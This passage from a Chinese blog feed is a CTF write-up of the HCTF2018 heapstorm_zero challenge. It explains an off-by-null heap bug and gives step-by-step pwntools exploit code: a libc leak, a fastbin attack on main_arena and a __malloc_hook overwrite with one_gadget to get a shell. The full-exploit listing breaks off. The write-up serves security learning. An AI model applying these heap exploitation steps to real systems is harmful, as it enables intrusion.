href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 